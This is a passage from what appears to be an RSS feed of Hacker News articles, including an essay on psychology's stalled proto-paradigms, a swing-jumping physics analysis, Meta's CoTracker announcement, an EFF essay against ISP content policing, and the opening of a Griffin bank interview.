bodies and brains synchronize when they are interacting”</p><p>“monkeys can use money (and pay for sex)”</p><p><span>Look, this isn't a systematic study; it's just a person asking for opinions on the internet. (Although, most of what psychology considers systematic studies are, in fact, just a person asking for opinions on the internet.) Plenty of these findings are interesting and some are useful (especially if you are a rich, lonely monkey). I think there's some terrific psychology that doesn't get mentioned here; I highlight some in </span><a href="https://www.experimental-history.com/p/underrated-ideas-in-psychology" rel="">Underrated ideas in psychology</a><span>.</span></p><p><span>But there's no world-changing insight like relativity, evolution, or DNA, nor any smaller-but-still-very-cool discoveries like polymerase chain reaction, CRISPR, or Higgs bosons. Only a few psychological discoveries are mentioned by more than one commenter, except for “most psychology studies are bunk.” If Bloom can't think of any major recent discoveries, and if none of his friends can agree on any major recent discoveries, then maybe there </span><em>aren't</em><span> any major recent discoveries.</span></p><p>(I know that might be a bummer to hear, but don't shoot the messenger. Besides, good luck trying to shoot a bunch of bees.)</p><p>Why doesn't psychology have more to show for itself? What's slowing us down?</p><p><span>Every science has its </span><a href="https://en.wikipedia.org/wiki/Paradigm" rel="">paradigms</a><span>, models of how things work and how you study them. Psychology doesn’t exactly have a paradigm; we’re still too young for that. But we do have ways of doing things, bundles of assumptions and practices that get handed down and spread around. Call ‘em proto-paradigms. We’re currently stuck with two proto-paradigms that were once useful but aren’t anymore, and one proto-paradigm that was never useful and will never be.</span></p><p><span>The first of the formerly useful ones will be familiar: this whole cognitive bias craze. Yes, humans do not always obey the optimal rules of decision-making, and this insight has won two </span><a href="https://www.nobelprize.org/prizes/economic-sciences/2017/summary/" rel="">Nobel</a><span> </span><a href="https://www.nobelprize.org/prizes/economic-sciences/2002/summary/" rel="">Prizes</a><span>. That's great! Well done, everyone. But we've been piling up cognitive biases since 1973, and the last 100 biases we added to the pile don’t seem to have done much. Adding the next 100 will probably do even less. It's time to </span><a href="https://worksinprogress.co/issue/biases-the-wrong-model" rel="">stop piling</a><span>.</span></p><p><span>The second formerly useful proto-paradigm is something like “situations matter.” This idea maintains that people's contexts have immense power over their behavior, and the strongest version maintains that the only difference between sinners and saints is their situations. The most famous psychology studies of all time are “situations matter” studies: the </span><a href="https://www.experimental-history.com/p/the-secret-shock-study" rel="">Milgram shock experiments</a><span>, the </span><a href="https://en.wikipedia.org/wiki/Asch_conformity_experiments" rel="">Asch conformity studies</a><span>, the </span><a href="https://en.wikipedia.org/wiki/Bystander_effect" rel="">bystander effect</a><span>, the </span><a href="https://www.prisonexp.org/" rel="">Stanford Prison Experiment</a><span> (since </span><a href="https://gwern.net/doc/psychology/2019-letexier.pdf" rel="">revealed</a><span> to be much more of a scripted play than a study). The now-much-ridiculed “social priming” studies, like the </span><a href="https://web.mit.edu/curhan/www/docs/Articles/15341_Readings/Social_Cognition/Bargh_et_al_1996_Automaticity_of_social_behavior.pdf" rel="">one</a><span> where you unscramble words about being old and then walk more slowly, are also “situations matter” studies. So are “</span><a href="https://en.wikipedia.org/wiki/Nudge_theory#:~:text=Nudges%20are%20small%20changes%20in,salience%20of%20the%20desired%20option." rel="">nudges</a><span>,” where tiny changes in situations bring big changes in behavior, like redoing the layout of a cafeteria to encourage people to eat more veggies.</span></p><p><span>This proto-paradigm, too, has run its course. Yes, situations influence people's behavior, more so than we would have once expected. But humans are not brainless automatons tossed about by their circumstances. That's why the most magical-seeming social priming studies keep </span><a href="https://journals.plos.org/plosone/article?id=10.1371/journal.pone.0029081" rel="">failing</a><a href="https://journals.plos.org/plosone/article?id=10.1371/journal.pone.0056515" rel=""> to</a><a href="https://journals.plos.org/plosone/article?id=10.1371/journal.pone.0072467" rel=""> replicate</a><span>, including the “unscrambling words about old people makes you walk slower,” one, and </span><a href="https://www.researchgate.net/publication/256111575_Out_Damned_Spot_Can_the_Macbeth_Effect_Be_Replicated" rel="">the one</a><span> where people desire cleaning products more after you make them think about being unethical (similar to Gino Study #1 above). Small changes in situations </span><em>can </em><span>have big effects, but </span><a href="https://www.pnas.org/doi/full/10.1073/pnas.2200300119" rel="">they often don't have any effect at all</a><span> (like Gino Study #4). Situations certainly matter, and we've got 70 years of studies to thank for that, but they aren't </span><em>all </em><span>that matters, and another 70 years of studies won't change either of those facts.</span></p><p>The third proto-paradigm has never been scientifically productive, and won't ever be. It's also a little harder to explain. Let's call this one “pick a noun and study it.”</p><p><span>Humans are very good at believing in useful fictions. The Ford Motor Company, for example, doesn't really exist in the way that you or I exist, or in the way that Jupiter exists, or even the way that a Ford F-150 exists. The Ford Motor Company is not its buildings, its CEO, its thousands of employees, its corporate charter, or its bank accounts; it's all those things, and then some. So even though “The Ford Motor Company” doesn’t exist in the normal way, believing in it is useful—it allows lots people to work together, make cars, and get paid. It also makes it easy for us to say things like “Ford fired its CEO” and “Ford reached a deal with the auto union” and “Ford still </span><a href="https://www.freep.com/story/money/cars/ford/2020/07/29/ford-government-loan-department-energy-debt/5526413002/" rel="">owes</a><span> the government money.”</span></p><p>Psychology also employs lots of fictions. Attitudes, norms, depression, the self, stereotypes, emotions, ideology, personality, creativity, morality, intelligence, stress—none of these things actually exist. They are abstract words we use to describe the things people do and the stuff that happens in their minds. It’s hard to talk about psychology without using them, so it’s easy to forget they’re just words.</p><p><span>In the “pick a noun and study it” proto-paradigm, you take one of these fictions and gather some data on it. For example, you could spend a thousand careers studying a fiction like </span><em>leadership</em><span>. How much do people value leadership? Can leadership predict a company's performance? Are there cross-cultural differences in leadership? Does leadership relate to other fictions, like ideology or creativity?</span></p><p>“Pick a noun and study it” has three fatal flaws. First, there's this whole tricky issue about fictions being fictional. You can't study leadership directly, so you have to turn it into something nonfictional that you can measure. “Studying leadership,” then, actually means studying responses to the Oregon Leadership Inventory or whatever, or counting the “leader-like” words that people use, or correlating the ratings that people give to their bosses. You could be watching little league soccer teams, or corporate board meetings, or subway conductors, and all this can get crammed under the heading of “studying leadership,” even though it’s possible that none of it has anything to do with anything else. This is about as useful as a grocery store that has one big section labeled “ITEMS.”</p><p>Second, “pick a noun” always gives you results. How much do people value leadership? More than zero, no doubt. Can leadership predict a company's performance? With your infinite freedom to define and measure leadership however you want, it sure can. Are there cross-cultural differences in leadership? Keep looking and you'll find some eventually.</p><p><span>And third, “pick a noun” never tells you to stop. How many leadership studies are required before we understand leadership? 500? 1,000? 1 million? How would we know? There are always more questions we can ask about leadership, more fictions we can correlate it with, more ways we can define it. It's a perpetual motion machine, a </span><a href="https://www.theintrinsicperspective.com/p/publish-and-perish" rel="">science game</a><span> that never ends.</span></p><p>So, some fictions are useful. We know the Ford Motor Company is a useful fiction because people use it every day to make cars. Psychological fictions are, so far, mainly useful for producing papers.</p><p>In other sciences, paradigms get overturned when they stop being able to explain the data coming in. If your theory can't account for why Neptune is over there right now, it's going to lose out to a theory that can.</p><p><span>Unfortunately, “humans are biased,” “situations matter,” and “pick a noun,” are unfalsifiable and inexhaustible. Nobody's ever going to prove that, actually, humans obey the laws of optimal decision making all the time. Nobody will show that situations don't matter at all. Nobody is going to demonstrate that leadership, creativity, or “</span><a href="https://en.wikipedia.org/wiki/Social_cryptomnesia" rel="">social cryptomnesia</a><span>” don’t exist. And we're never going to run out of biases, situations, or words. It's horrifying to think, but these proto-paradigms could be immortal.</span></p><p><span>But immortal does not mean invulnerable. Another way that paradigms die is people simply lose interest in them, so our best ally against these zombie paradigms is </span><em>boredom</em><span>. And we've got plenty. Psychologists already barely care about the findings in their own field; that's why, when we hear about another replication massacre, we don't even bother to ID the bodies. We're hungry for something that makes us </span><em>feel</em><span>. A few decades from now, when a wizened Bloom asks his question again, we hope for a world where people pile into the comments with major discoveries. Or, better yet, a world where Bloom doesn't even have to ask in the first place, because the answer is so obvious. (Imagine a computer scientist asking Twitter, “Hey guys, anybody hear about any big breakthroughs in computer science in the past few decades?”)</span></p><p>So yes, it's a shame when we find out that esteemed members of our community might have made up data. That's bad, and they shouldn't do it. But catching the cheaters won't bring our field back to life. Only new ideas can do that. Sweet, sweet ideas, ideas that matter, ideas that you can build on, ideas that would take something with them if they disappeared. That's what I'm going to look for, and fortunately I am good at searching for sweet things and reporting back about their location, because I am not a human at all, but a bunch of bees.</p><p>(Please don't sue me.)</p></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Meta AI releases CoTracker, a model for tracking any points (pixels) on a video (279 pts)]]></title>
            <link>https://co-tracker.github.io/</link>
            <guid>37314073</guid>
            <pubDate>Tue, 29 Aug 2023 21:04:14 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://co-tracker.github.io/">https://co-tracker.github.io/</a>, See on <a href="https://news.ycombinator.com/item?id=37314073">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
            <p>
              Methods for video motion prediction either estimate jointly the instantaneous motion
              of all points in a given video frame using optical flow, or track the motion of individual points
              throughout the video, but independently.
              The latter is true even for powerful deep learning methods that can track points through occlusions.
              Tracking points individually ignores the strong correlation that can exist between the points, for
              instance when they arise from the same physical object, potentially harming performance.
            </p>
            <p>
              In this paper, we thus propose CoTracker, an architecture that jointly tracks multiple points throughout
              an entire video.
              This architecture is based on several ideas from the optical flow and tracking literature, and combines
              them in a new,
              flexible and powerful design. It is based on a transformer network that models the correlation of
              different points in time via specialised attention layers.
            </p>
            <p>
            The transformer is designed to update iteratively an estimate of several trajectories.
            It can be applied in a sliding-window manner to very long videos, for which we engineer an unrolled
            training
            loop.
            It compares favourably against state-of-the-art point tracking methods, both in terms of efficiency and
            accuracy.

            </p>

          </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[How far can you jump from a swing? (224 pts)]]></title>
            <link>https://www.alexmolas.com/2023/08/18/how-far-can-you-jump.html</link>
            <guid>37313493</guid>
            <pubDate>Tue, 29 Aug 2023 20:26:50 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.alexmolas.com/2023/08/18/how-far-can-you-jump.html">https://www.alexmolas.com/2023/08/18/how-far-can-you-jump.html</a>, See on <a href="https://news.ycombinator.com/item?id=37313493">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
    


  <title>How far can you jump from a swing?</title>
  
  
  
  
  
    
  


  <!-- Header -->
  

  <!-- Post Content -->
    <a href="https://www.alexmolas.com/">Back to Home</a>
    <hr>
    
    <i><p>August 18, 2023</p></i>
      <blockquote>
  <p>Discussion on <a href="https://news.ycombinator.com/item?id=37313493">HackerNews</a>.<br>
Some people pointed out some flaws in my modelling (eg: assuming zero distance from swing to floor) which I’ve tried to fix.  The original maximum distance estimation was around $1m$.</p>
</blockquote>

<p>This summer I’ve spent an absurd amount of time reading and learning about the physics of swings. Yes, you read it right, I’ve been learning about the physical processes that happen when a kid is playing with a swing in the park. Blame it on my kids and the countless hours spent enjoying these moments with them. In particular, I read about the physics of pumping a swing and about the physics of jumping from a swing. Amidst my deep dive into swing physics, I came up with a new Olympic sport in which you start seated on a swing with length $L$, your feet comfortably touching the ground. As a countdown of $T$ seconds commences, you embark on the art of swing-pumping. Your challenge is to execute a skillful leap before the countdown reaches zero. With your jump, you travel a distance $d$ from your initial point, aiming to achieve the greatest possible $d$.</p>

<p>The question is then, which is the best method to maximize $d$?</p>

<p>Before I present you with the answer to the question I’ll summarize the learnings I got from reading about the physics of a swing. As usual, you can find all the code I used for this post in my <a href="https://github.com/alexmolas/alexmolas.github.io/tree/master/notebooks/swing">repo</a>.</p>

<figure>
  <img src="https://www.alexmolas.com/docs/swing/swing_drawing.png" alt="Swing Drawing" width="300">
  <figcaption>I love this image, and I wish more papers had this kind of picture on them. Image from [^2]</figcaption>
</figure>
<p>Notice that <sup id="fnref:4" role="doc-noteref"><a href="#fn:4" rel="footnote">1</a></sup> and <sup id="fnref:5" role="doc-noteref"><a href="#fn:5" rel="footnote">2</a></sup> answer a very similar question: what is the optimal time $t$ to jump off, so as to reach farthest. However, these references do not deal with the pumping of a swing, they just assume that you start swinging at some angle $\lambda$ and jump at an angle $\phi$, without pumping the swing at any point. Solving this problem is interesting, but I think it’s more exciting to solve it when the person swinging can control the system. This makes it feel more like a real game that you can play in a park or at the Olympic Games.</p>

<h2 id="pumping-a-swing">Pumping a swing</h2>

<p>There are several papers about the pumping of a swing <sup id="fnref:1" role="doc-noteref"><a href="#fn:1" rel="footnote">3</a></sup>, <sup id="fnref:2" role="doc-noteref"><a href="#fn:2" rel="footnote">4</a></sup>, and <sup id="fnref:3" role="doc-noteref"><a href="#fn:3" rel="footnote">5</a></sup> and much more. In this section, I’ll focus in particular on <sup id="fnref:2:1" role="doc-noteref"><a href="#fn:2" rel="footnote">4</a></sup>.</p>

<p>The model for a swing I’ll use is a rigid dumbbell made up of three masses, suspended by a rigid rod of length $l_1$ attached to the middle mass $m_1$. The distances from $m_1$ to the other masses $m_2$ and $m_3$ are $l_2$ and $l_3$ respectively. The angle of the rod $l_1$ with the vertical is $\phi$ and the angle of the dumbbell with the rod is $\theta$. In the next figure, you can see a diagram of the system</p>

<figure>
  <img src="https://www.alexmolas.com/docs/swing/swing_diagram.png" alt="Swing diagram" width="500">
</figure>

<p>The Lagrangian of this system is</p>

\[\begin{align}
\mathcal{L} = &amp; \frac{1}{2} I_1 \dot\phi^2 + \frac{1}{2} I_2 \left(\dot\phi + \dot\theta\right)^2 - l_1 N \dot\phi\left( \dot \phi + \dot\theta \right) \cos \theta \\
&amp;+ M l_1 g \cos \phi - N g \cos\left(\phi + \theta\right)
\end{align}\]

<p>where $M = m_1 + m_2 + m_3$, $N = m_3 l_3 - m_2 l_2$, $I_1 = M l_1^2$, and $I_2 = m_2 l_2^2 + m_3 l_3^2$. Therefore, the Lagrange’s equation for $\phi$ is</p>

\[\begin{align}
(I_1 + I_2) \ddot \phi + M l_1 \sin \phi = &amp; -I_2 \ddot \theta - l_1 N \dot\theta^2 \sin \theta \\
&amp; + l_1 N \dot\theta^2 \cos \theta + N g \sin(\phi + \theta) \\
&amp; - 2 l_1 N \dot \theta \dot \phi \sin \theta \\
&amp; + 2l_1 N \ddot \phi \cos \theta
\end{align}\]

<p>The paper proceeds by assuming the swinger pumps the swing by forcing $\theta(t) = \theta_0 \cos(\omega t)$, where $\omega$ is the natural angular frequency of the pendulum. Then, they show that there are two regimes, one where $\phi &lt; \phi_{\text{crit}}$ where the movement is like an harmonic driven oscillator, and another one where $\phi &gt; \phi_{\text{crit}}$ where the movement is an harmonic oscillator with parametric terms. They then analyze the different regimes and solve their equations. In summary, they show that for small amplitudes the swing follows the equation</p>

\[\ddot \phi + \omega_0^2\phi = F \cos(\omega t)\]

<p>where</p>

\[\begin{align}
&amp;\omega_0= K_0/I_0\\
&amp;I_0=I_1 + I_2 - 2l_1 N (1 - \theta_0^2/4 )\\
&amp;K_0=Ml_1g - Ng(1 - \theta_0^2/4)\\
&amp;F=\theta_0 \left[ (\omega^2 I_2 + N(g - \omega_0^2l_1)(1 - \theta_0^2/8)\right]/I_0
\end{align}\]

<p>The differential equation has the solution</p>

\[\phi(t) = \left(\frac{F}{\omega_0^2 - \omega^2}\right)\left(\cos \omega t - \cos \omega_0t\right)\]

<p>which looks like for small $t$</p>

<figure>
  <img src="https://www.alexmolas.com/docs/swing/phi_t.svg" alt="phi(t)" width="500">
  <figcaption>Solution for $\phi(t)$, with $F=0.085$, $\omega=2.21$, $\omega_0=2.23$</figcaption>
</figure>

<p>This solution is good enough for our approach since I assume $T$ to be small enough to avoid the swinger pumping the swing to big $\phi$ values.</p>

<h2 id="jumping-from-a-swing">Jumping from a swing</h2>

<p>Now let’s study how should a swinger jump from a swing to maximize the traveled distance. The analysis presented here is based on the work of Jason Cole <sup id="fnref:4:1" role="doc-noteref"><a href="#fn:4" rel="footnote">1</a></sup> and Hiroyuki Shima <sup id="fnref:5:1" role="doc-noteref"><a href="#fn:5" rel="footnote">2</a></sup>. Notice that the naive solution of jumping at $\phi=\pi/4$ is not optimal. For instance, imagine a swing that oscillates in the range $\pm \pi/4$, then it’s clear that jumping at $\pi/4$ is suboptimal since the swinger will start its flight with a speed of zero.</p>

<figure>
  <img src="https://www.alexmolas.com/docs/swing/swing_jump.png" alt="Jumping from a swing" width="500">
  <figcaption>Diagram showing the situation just after jumping from the swing. Notice that instead of $h$ I'm using $l_1$, and I'm using $h$ as the distance from the swing to the ground, sorry for the confusing notation. Image from [^4]. </figcaption>
</figure>

<p>Notice I’m adding a new variable $h$ that represents the distance from the swing to the ground. This variable is not present on Jason’s blog but it’s on Hiroyuki paper. Once you jump from the swing, the equations of motion for the horizontal and the vertical directions are</p>

\[\begin{cases}
x(t) = l_1 \sin \phi + v t\cos\phi \\
y(t) = h + l_1(1 - \cos \phi) + vt \sin \phi - \frac{1}{2}gt^2 
\end{cases}\]

<p>Now, we can compute the total flight time by solving $y(t_{\text{flight}})=0$ and then compute the flight distance as $d = x(t_{\text{flight}})$. The flight time is then</p>

\[t_{\text{flight}} = \frac{v\sin\phi \pm\sqrt{v^2\sin^2\phi+2g(h+l_1(1-\cos\phi))}}{g}\]

<p>now notice that only the positive root has physical meaning (we don’t want negative times), so the distance is</p>

\[\begin{align}
d = &amp; l_1 \sin\phi + \frac{v^2 \sin\phi\cos\phi}{g} \\
&amp; + \sqrt{\frac{2v^2\cos^2\phi(h+l_1(1-\cos\phi))}{g}+\left(\frac{v^2\sin\phi\cos\phi}{g}\right)^2}
\end{align}\]

<h2 id="putting-everything-together">Putting everything together</h2>

<p>We have now all the pieces we need to solve the problem. On one hand, we can compute the swinger angle $\phi$ for any given $t$, and we can also compute the distance that the swinger will travel when leaving the swing at an angle $\phi$.</p>

<p>Notice that to compute $d$ we need to know $v$. In other sources that study this problem, they get $v$ by using energy conservation, however, in our case, we know $\phi(t)$ and we can get the initial velocity after leaving the swing as $v(t) = l_1 \frac{d}{dt} \phi(t)$</p>

\[v(t) = \frac{l_1F}{\omega^2_0 - \omega^2}(\omega\cos\omega t - \omega_0\cos \omega_0 t)\]

<p>Now, putting everything together we have this set of equations</p>

\[\begin{cases}
d(t) =l_1 \sin\phi(t) + \frac{v^2 \sin\phi(t)\cos\phi(t)}{g} + \sqrt{\frac{2v^2\cos^2\phi(h+l_1(1-\cos\phi))}{g}+\left(\frac{v(t)^2\sin\phi(t)\cos\phi(t)}{g}\right)^2} \\

\phi(t) = \frac{F}{\omega_0^2 - \omega^2}\left(\cos \omega t - \cos \omega_0t\right) \\

v(t) = \frac{l_1F}{\omega^2_0 - \omega^2}(\omega\cos\omega t - \omega_0\cos \omega_0 t)
\end{cases}\]

<p>To compute $d(t)$ we just need to compute $\phi(t)$ and $v(t)$ and substitute the values in the first equation. I’ll use the following constants: $M=1$, $m_1=0.4M$, $m_2 = 0.2M$, $m_3 = 0.4M$, $l_1 = 2$, $l_2 = 0.4$, $l_3 = 0.4$, $h=l_3$, $\theta_0=1$, $g= 9.8$, $T=2 \pi \sqrt{l1 / g}$, and $\omega= 2\pi/T$</p>

<p>With these parameters, we can now plot the traveled distance as a function of the jumping time.</p>

<figure>
  <img src="https://www.alexmolas.com/docs/swing/distance_vs_t.svg" alt="Traveled distance as a function of jumping time" width="500">
</figure>

<p>Let’s remember that we’re interested in the optimal jumping time $t^*$ for a given maximum time $T$. To do so we just need to fix a time $T$ and find at which $t^* &lt; T$ the distance $d(t)$ is maximized. I did that numerically and plotted the results in the next image</p>

<figure>
  <img src="https://www.alexmolas.com/docs/swing/optimal_time.svg" alt="Optimal jumping time" width="500">
</figure>

<p>Of course, the optimal jumping time follows a ladder-like curve. This is because you’re not interested in jumping backward, and sometimes it’s better to jump some seconds before $T$ than to wait for $T$ and find yourself in a worse position.</p>

<p>Finally, we can get also the maximum traveled distance as a function of $T$.</p>

<figure>
  <img src="https://www.alexmolas.com/docs/swing/max_distance.svg" alt="Traveled distance as a function of jumping time" width="500">
</figure>

<p>For example, if $T=20s$, which seems like a reasonable value to make the sport interesting, one would expect to achieve $d\approx 2m$.</p>

<h2 id="conclusion">Conclusion</h2>

<p>Well, that’s all for today. In this post, I’ve presented a new Olympic sport that consists of pumping on a swing during a given amount of time and then jumping and trying to achieve the maximum distance. With the parameters used in my simulations, I would expect the world record to be around two meters.</p>

<p>The analysis presented here is full of simplifications. Here I list some of the ones I’m aware of</p>

<ul>
  <li>The swinger model is oversimplified. For instance, authors in <sup id="fnref:3:1" role="doc-noteref"><a href="#fn:3" rel="footnote">5</a></sup> present a model which is more accurate than the one used here. However, I wanted to keep the analysis “simple”.</li>
  <li>The swinger is assumed to operate in the regime of small $\phi$, which allows us to use an analytical equation for $\phi(t)$. However, an experimented swinger could achieve big oscillation angles in a short amount of time, and then our simplification wouldn’t be valid anymore.</li>
  <li>As a good physicist I’ve neglected any kind of friction (swing-rod, swinger-air, etc.).</li>
</ul>

<p>Even with all this simplification, I think the analysis stills bring some light to the problem of maximizing the flight distance. Now, the only step still missing is the experimental one: go to a park and try to beat the theoretical maximum distance. According to my numbers, you wouldn’t be able to beat the 2-meter mark.</p>

<p>All of this reminds me of the anecdote of the mathematician and his wife moving a sofa. The mathematician spent a lot of time computing if it was possible to move the sofa from one room to the other, and finally proved it was impossible. Then he went to show it to his wife, which had already moved the sofa to the other room. So I’m pretty sure that it’s going to be possible to beat my theoretical maximum distance. Unfortunately, I don’t have a swing near me right now, so I’ll have to wait until the next visit to the park.</p>

<hr>

<h2 id="appendix-1-optimal-distribution-of-masses">Appendix 1: optimal distribution of masses</h2>

<p>Some days after publishing this post I started wondering which was the combination of masses $m_1$, $m_2$, and $m_3$ that allowed for the best results, aka how should a Swing Jumping world champion look like. To do so I have fixed all the parameters except the masses, and I’ve forced $1 = m_1 + m_2 + m_3$ since the behavior of the system is independent of the total mass $M$.</p>

<p>In the next plot we see how the maximum distance depends on $m_2$ and $m_3$. The red star shows where the combination of masses that maximized the distance.</p>

<figure>
  <img src="https://www.alexmolas.com/docs/swing/distance_vs_masses.png" alt="$m1$ &amp; $m2$ vs max distance" width="500">
</figure>

<p>The best combination of masses is $m_1=0$, $m_2 \approx 0.625$ and $m_3 \approx 0.375$. Of course this is not a solution that’s feasible - maybe . Setting a minimum value for $m_1 &gt; 0.1$ we get a different optimal distribution of masses, ie: $m_1\approx 0.2$, $m_2 \approx 0.5$, and $m_3 \approx 0.3$. So we see that the optimal solution is always to minimize $m_1$.</p>

<figure>
  <img src="https://www.alexmolas.com/docs/swing/distance_vs_masses_clipped.png" alt="$m1$ &amp; $m2$ vs max distance for a clipped value of $m1$" width="500">
</figure>

<p>With these new masses the maxiumum distance is around $3m$ which is considerably higher than our first result.</p>

<p>We could also analyze the best combination of lengths $l_*$ and masses $m_*$ that maximize the distance, however I don’t think it’s going to add a lot of value to the study so I’ll leave the analysis as it is now.</p>

<hr>




  <!-- Footer -->
  



  </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[ISPs Should Not Police Online Speech – No Matter How Awful It Is (1182 pts)]]></title>
            <link>https://www.eff.org/deeplinks/2023/08/isps-should-not-police-online-speech-no-matter-how-awful-it</link>
            <guid>37313349</guid>
            <pubDate>Tue, 29 Aug 2023 20:17:54 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.eff.org/deeplinks/2023/08/isps-should-not-police-online-speech-no-matter-how-awful-it">https://www.eff.org/deeplinks/2023/08/isps-should-not-police-online-speech-no-matter-how-awful-it</a>, See on <a href="https://news.ycombinator.com/item?id=37313349">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
            <article role="article">
  
  
  <div><p>Entrusting our speech to multiple different corporate actors is always risky. Yet given how most of the internet is currently structured, our online expression largely depends on a set of private companies ranging from our direct Internet service providers and platforms, to upstream ISPs (sometimes called Tier 2 and 3), all the way up to Tier 1 ISPs (or the Internet backbone) that have no direct relationships with most users.</p>
<p>Tier 1 ISPs play a unique role in the internet “stack,” because numerous other service providers depend on Tier 1 companies to serve their customers. As a result, Tier 1 providers can be especially powerful chokepoints—given their reach, their content policies can affect large swaths of the web. At the same time given their distant relationship to speakers, Tier 1 ISPs have little if any context to make good decisions about their speech.</p>
<p>At EFF, we have long represented and assisted people from around the world—and across various political spectrums—facing censorship. That experience tells us that one of the most dangerous types of censorship happens at the site of a unique imbalance of power in the structures of the internet: when an internet service is both necessary for the web to function and simultaneously has no meaningful alternatives. That’s why EFF has long argued that we must “<a href="https://protectthestack.org/">protect the stack</a>” by saying no to infrastructure providers policing internet content. We’ve warned that endorsing censorship in one context can (and does) come back to bite us all when, inevitably, that same approach is used in another context. Pressure on basic infrastructure, as a tactic, will be re-used, inevitably, against unjustly marginalized speakers and forums. <a href="https://protectthestack.org/">It already is</a>.&nbsp;&nbsp;</p>
<p>So we were concerned when we started hearing from multiple sources that Hurricane Electric, a Tier 1 ISP, is interfering with traffic. Confirmation of the details has been difficult, in part because Hurricane itself has refused to respond to our queries, but it appears that the company is partially denying service to a direct customer, a provider called Crunchbits, in order to disrupt traffic to a site that is several steps away in the stack. And it is justifying that action because activity on the site reportedly violates Hurricane’s “acceptable use policy”—even though Hurricane has no direct relationship with that site. Hurricane argues that the policy requires its direct customers to police <em>their </em>customers as well as themselves.</p>
<p>If the site in question were Reddit, or Planned Parenthood, or even EFF, the internet would be up in arms. It is not, and it’s not hard to see why. The affected site is an almost universally despised forum for hateful speech and planning vicious attacks on vulnerable people: Kiwi Farms. For many, the natural response is to declare good riddance to bad rubbish—and understandably so.</p>
<p>At EFF, our mission and history requires us to look at the bigger picture, and sound the alarm about the risks even when the facts are horrific.</p>
<p>That means we need to say it even if it’s not comfortable: Hurricane Electric is wrong here.&nbsp; It gives us no joy to call Hurricane on this, not least because many will perceive it as an implicit defense of the KF site. <em>It is not.</em> A site that provides a forum for gamifying abuse and doxxing, whose users have celebrated on its pages the IRL deaths of the targets of their harassment campaigns, deserves no sympathy.&nbsp; We fully support criminal and civil liability for those who abuse and harass others.</p>
<p>But just because there’s a serious problem doesn’t mean that every response is a good one.&nbsp; And regardless of good intentions, Hurricane’s role as a Tier 1 ISP means that their interference is a dangerous step. Let us explain why.</p>
<p>For one thing, Tier 1 ISPs like Hurricane are often monopolies or near-monopolies, so users have few alternatives if they are blocked. Censorship is more powerful if you don’t have somewhere else to go.&nbsp; To be clear, at time of writing, there are two mirrored instances of KF online: one on the clear web at a country code top-level domain, and the other an onion service on the Tor network. So right now this isn’t a “lights out” situation for KF, and generally the Tor network will prevent that from happening entirely. The so-called “dark web” has plenty of deserved ill repute, however, so although it is resistant to censorship by Tier 1 ISPs, it is not a meaningful option for many, much less an accessible one.</p>
<p>Which brings us to the second point: this approach is usually a one-way ratchet. Once an ISP indicates it’s willing to police content by blocking traffic, more pressure from other quarters will follow, and they won’t all share your views or values. For example, an ISP, under pressure from the attorney general of a state that bans abortions, might decide to interfere with traffic to a site that raises money to help people get abortions, or provides information about self-managed abortions. Having set a precedent in one context, it is very difficult for an ISP to deny it in another, especially when even considering the request takes skill and nuance.&nbsp; We all know how lousy big user-facing platforms like Facebook are at content moderation—and that’s with significant resources. Tier 1 ISPs don’t have the ability or the incentive to build content evaluation teams that are even as effective as those of the giant platforms who know far more about their end users and yet <a href="https://www.onlinecensorship.org/">still engage in harmful censorship</a>. ISPs like Hurricane Electric are bound to be far <em>worse</em> than Facebook and its peers at sorting bad content from good, which is why they should not open this door.</p>
<p>Finally, site-blocking, whatever form it takes, almost inevitably cuts off legal as well as illegal speech. It cuts with a chain saw rather than a scalpel.</p>
<p>We know that many believe that KF is uniquely awful, so that it is justifiable to take measures against them that we wouldn’t condone against anyone else. The thing is, that argument doesn’t square with reality, online or offline.&nbsp; Crossing the line to Tier 1 blocking won’t just happen once.</p>
<p>To put it even more simply: When a person uses a room in a house to engage in illegal or just terrible activity, we don’t call on the electric company to cut off the light and heat to the entire house, or the post office to stop delivering mail. We know that this will backfire in the long run. Instead, we go after the bad guys themselves and hold them accountable.</p>
<p>That’s what must happen here. The cops and the courts should be working to protect the victims of KF and go after the perpetrators with every legal tool at their disposal. We should be giving them the resources and societal mandate to do so. Solid enforcement of existing laws is something that has been sorely lacking for harassment and abuse online, and it’s one of the reasons people turn to censorship strategies. Finally, we should enact strong data privacy laws that target, among others, the data brokers whose services help enable doxxing.</p>
<p>In the meantime, Tier 1 ISPs like Hurricane should resist the temptation to step in where law enforcement and legislators have failed. The firmest, most consistent approach infrastructure chokepoints like ISPs can take is to simply refuse to be chokepoints at all. Ultimately, that’s also the best way to safeguard human rights. We do not need more corporate speech police, however well-meaning.</p>

</div>

          </article>
    </div><div>
          <h2>Join EFF Lists</h2>
        
    </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Griffin - A fully-regulated, API-driven bank, with Clojure (366 pts)]]></title>
            <link>https://www.juxt.pro/blog/clojure-in-griffin/</link>
            <guid>37313183</guid>
            <pubDate>Tue, 29 Aug 2023 20:06:11 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.juxt.pro/blog/clojure-in-griffin/">https://www.juxt.pro/blog/clojure-in-griffin/</a>, See on <a href="https://news.ycombinator.com/item?id=37313183">Hacker News</a></p>
<div id="readability-page-1" class="page"><article>
      <p><a href="https://griffin.com/">Griffin</a> is a banking-as-a-service platform and part of the new wave of API-driven banking. Their services allow Fintech businesses to integrate banking features quickly and securely. In March 2023, Griffin was granted their UK banking license by the Financial Conduct Authority, making them a fully-regulated UK bank.</p>
<p>We caught up with Allen Rohner, Griffin Co-founder and CTO (also Co-founder of CircleCI), to discuss how they’ve built a bank, from the ground up, using Clojure.</p>


<img alt="Griffin" width="300" height="68" src="https://www.juxt.pro/_astro/griffin-logo-on-light.ca24a593_UHLTP.png" loading="lazy" decoding="async">
<img alt="Griffin" width="300" height="68" src="https://www.juxt.pro/_astro/griffin-logo-on-dark.9075282a_1rKtSY.png" loading="lazy" decoding="async">
<p><strong>Joe: So what does Griffin do?</strong></p>
